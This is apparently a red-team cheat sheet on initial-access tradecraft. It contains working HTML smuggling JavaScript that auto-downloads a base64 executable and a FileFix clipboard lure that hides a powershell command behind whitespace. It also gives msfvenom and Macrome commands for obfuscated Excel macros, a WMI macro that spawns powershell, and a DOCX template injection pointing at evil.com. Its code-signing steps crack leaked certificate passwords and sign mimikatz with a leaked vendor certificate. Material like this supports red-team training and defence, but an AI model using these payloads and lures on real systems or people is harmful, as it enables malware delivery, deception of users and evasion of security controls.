Initial Access (Red Team)

Red-team initial access — the DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY)) pattern that modern intrusions follow, ISO/IMG/ZIP/WIM containers that strip MOTW, LNK/CHM/ClickOnce triggers, payload types (binaries, DLLs, CPL, macros, WSF, MSI, MSIX, ClickOnce), HTML Smuggling, ClickFix / FileFix social engineering, Office macro attacks (DOCM/XLSM/XLM/DOCX template injection), GoPhish, and code signing.

Initial access in red team exercises refers to the set of files, scripts, executables, or documents used to initially infiltrate the target system or network. These files often contain malicious payloads or exploit specific vulnerabilities to establish a foothold.

Complex Attack Chains

Attack chains follow this pattern: DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY))

  • DELIVERY: means to deliver a pack full of files
  • HTML Smuggling, SVG Smuggling, Attachments
  • CONTAINER: archive bundling all infection dependencies
  • ISO/IMG, ZIP, WIM
  • TRIGGER: some way to run the payload
  • LNK, CHM, ClickOnce applications
  • PAYLOAD: the malware
  • Binary Files
  • Code Execution Files
  • Embedded Files
  • DECOY: used to continue pretext narration after detonating malware
  • Typically open PDF files

Example: HTML SMUGGLING(PASSWORD PROTECTED ZIP + ISO(LNK + IcedID + PNG)) used by TA551/Storm-0303

Container Formats

ISO/IMG

  • Can contain hidden files
  • Gets automounted giving easy access to contained files
  • Execute: powershell –c .\malware.exe

ZIP

  • Can contain hidden files
  • Locate ZIP, unpack it, change dir, run Malware

WIM (Windows Image)

Builtin format used to deploy system features:

## Mount/Unmount .WIM
Mount-WindowsImage -ImagePath myarchive.wim -Path "C:\output\path\to\extract" -Index 1
Dismount-WindowsImage -Path "C:\output\path\to\extract" -Discard

7-zip, RAR, GZ

Should get native support on Windows 11

Trigger Mechanisms

  • LNK (shortcuts)
  • CHM (Compiled HTML Help)
  • ClickOnce (application installer)

Payload Types

Binary Files

Execute directly on the system without third party:

  • .exe: executable file, run with a click
  • .dll: execute with rundll32 main.dll,DllMain
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

extern "C" __declspec(dllexport)
DWORD WINAPI MessageBoxThread(LPVOID lpParam) {
    MessageBox(NULL, "Hello world!", "Hello World!", NULL);
    return 0;
}

extern "C" __declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule,
                    DWORD ul_reason_for_call,
                    LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, NULL, MessageBoxThread, NULL, NULL, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

HTML Smuggling

HTML Smuggling consists of making a user navigate to a crafted HTML page which automatically downloads a malicious file.

Executable Storage

Store payload in a Blob object and create an Object URL:

var blob = new Blob([data], {type: 'octet/stream'});
var url = window.URL.createObjectURL(blob);

Create a hidden <a> tag for download:

var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);

Encode payload in Base64:

function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}

var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...';
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'NotAMalware.exe';

ClickFix

ClickFix is a social engineering attack that prompts users to unknowingly execute malicious code through the Run Dialog.

FileFix Variant

Display a message luring the user into copying and pasting a command in a shell:

To access the file, follow these steps:
1. Copy the file path below:
   C:\company\internal-secure\filedrive\HRPolicy.docx
2. Open File Explorer and select the address bar (CTRL + L)
3. Paste the file path and press Enter

When the user clicks "COPY", set clipboard to:

navigator.clipboard.writeText("powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    ");

Tricks:

  • Multiple spaces to hide the start of the payload
  • Comment with # containing a fake path to the document

Note: Executable files executed through File Explorer's address bar have their Mark Of The Web (MOTW) attribute removed.

XLM - Macrome

XOR Obfuscation technique for Excel 4.0 macros (VBA won't work):

## Generate shellcode
msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin
msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin

## Build document
dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin

## With password (VelvetSweatshop is auto-decrypted)
Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop

Sub wmi_exec()
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartUp = objWMIService.Get("Win32_ProcessStartup")
    Set objProc = objWMIService.Get("Win32_Process")
    Set procStartConfig = objStartUp.SpawnInstance_
    procStartConfig.ShowWindow = 1
    objProc.Create "powershell.exe", Null, procStartConfig, intProcessID
End Sub

DOCX - Template Injection

Template injection does not require "Enable Macro".

  1. Create malicious macro in .dotm template file
  2. Create benign .docx file
  3. Save as .docx, rename to .zip, unzip
  4. Edit .\word_rels\settings.xml.rels to reference malicious template (HTTP or WebDAV):
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.com/malicious.dotm" TargetMode="External"/>
</Relationships>
  1. Zip back up and rename to .docx

Code Signing

Certificates can be Expired, Revoked, or Valid.

Many certificates are leaked and re-used by threat actors. Find them on VirusTotal with: content:{02 01 03 30}@4 AND NOT tag:peexe

Password-protected certificates:

john --wordlist=/opt/wordlists/rockyou.txt --format=pfx pfx.hashes

Sign binary with certificate:

osslsigncode sign -pkcs12 certs/nvidia-2014.pfx -in mimikatz.exe -out signed-mimikatz.exe -pass nv1d1aRules

Signable file types:

  • Executables: .exe, .dll, .ocx, .xll, .wll
  • Scripts: .vbs, .js, .ps1
  • Installers: .msi, .msix, .appx, .msixbundle, .appxbundle
  • Drivers: .sys
  • Cabinets: .cab
  • ClickOnce: .application, .manifest, .vsto
